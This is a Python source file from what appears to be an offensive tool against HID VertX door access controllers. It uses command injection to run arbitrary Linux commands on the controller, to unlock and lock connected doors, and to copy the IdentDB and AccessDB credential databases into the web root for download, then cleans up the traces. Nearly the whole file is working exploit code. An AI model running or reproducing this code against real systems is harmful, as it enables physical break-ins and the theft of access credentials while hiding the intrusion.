# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
from __future__ import print_function
from __future__ import unicode_literals

from main import VertXController


class Actions(VertXController):
	HEADERS = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'close'
	}

	def __init__(self, ip, username=None, password=''):
		self.ip = ip
		self.vertx_info = self.info()

		if username:
			self.session = requests.Session()
			self.session.headers = self.HEADERS
			self.session.auth = (username, password)

	def fingerprint(self):
		"""
		Fingerprint the VertX controller.

		Also check the firmware version and determines if the controller is vulnerable to command injection.
		Legacy VertX controllers were patched with firmware > 2.2.7.568
		VertX EVO and EDGE EVO controllers were patched with firmware > 3.5.1.1483
		"""
		return self.vertx_info

	def raw(self, command):
		"""
		Send a native Linux command to be executed on the VertX controller.
		"""
		response = self.inject_command(command)
		if response[0].split(';')[0] == 'ack':
			status = True
			if len(command) >= 41:
				self.clean()
		else:
			status = False

		return status

	def unlock(self):
		"""
		Using command injection, or through the web interface, unlock doors connected to the VertX controller.
		"""
		action = "?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1".format(self.vertx_info['model'])

		# Unlock through command injection
		if self.vertx_info['vulnerable']:
			commands = [
				'export QUERY_STRING="{0}"'.format(action),
				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
			]

			response = self.inject_command(commands)
			if response[0].split(';')[0] == 'ack':
				status = True
				self.clean()
			else:
				status = False

		# Unlock through web interface
		else:
			url = "http://{0}/cgi-bin/diagnostics_execute.cgi{1}&MS={2}406".format(self.ip, action, int(time.time()))
			response = self.web_request(url)
			if response.status_code == 401:
				status = None
			elif (response.text).split(';')[1] == '-1504':
				status = True
			else:
				status = False

		return status

	def lock(self):
		"""
		Using command injection or through the web interface, lock doors connected to the VertX controller.
		"""
		action = "?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0".format(self.vertx_info['model'])

		# Unlock through command injection
		if self.vertx_info['vulnerable']:
			commands = [
				'export QUERY_STRING="{0}"'.format(action),
				'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
			]

			response = self.inject_command(commands)
			if response[0].split(';')[0] == 'ack':
				status = True
				self.clean()
			else:
				status = False

		# Unlock through web interface
		else:
			url = "http://{0}/cgi-bin/diagnostics_execute.cgi{1}&MS={2}406".format(self.ip, action, int(time.time()))
			response = self.web_request(url)
			if response.status_code == 401:
				status = None
			elif (response.text).split(';')[1] == '-1504':
				status = True
			else:
				status = False

		return status

	def download(self):
		"""
		Download IdentDB and AccessDB from VertX controller.
		"""
		databases = {
			'IdentDB': None,
			'AccessDB': None
		}

		commands = [
			'cp /mnt/data/config/IdentDB /tmp/',
			'cp /mnt/data/config/AccessDB /tmp/',
			'mv /tmp/IdentDB /mnt/apps/web/',
			'mv /tmp/AccessDB /mnt/apps/web/'
		]

		if self.web_request("http://{0}".format(self.ip)).status_code == 200:
			response = self.inject_command(commands)
			if response[0].split(';')[0] == 'ack':
				time.sleep(1)
			else:
				return databases

			for database in databases:
				try:
					response = self.session.get(
						"http://{0}/{1}".format(self.ip, database),
						stream=True,
						verify=False
					)
				except requests.exceptions.RequestException as error:
					raise Exception('VertX web server did not respond')

				if response.status_code == 200:
					databases[database] = True
					with open(database, 'wb') as f:
						for chunk in response.iter_content(chunk_size=1024):
							f.write(chunk)
					f.close()

			# Clean up
			temp_files = [
				'/mnt/apps/web/IdentDB',
				'/mnt/apps/web/AccessDB'
			]
			self.clean(temp_files)

		else:
			return False

		return databases
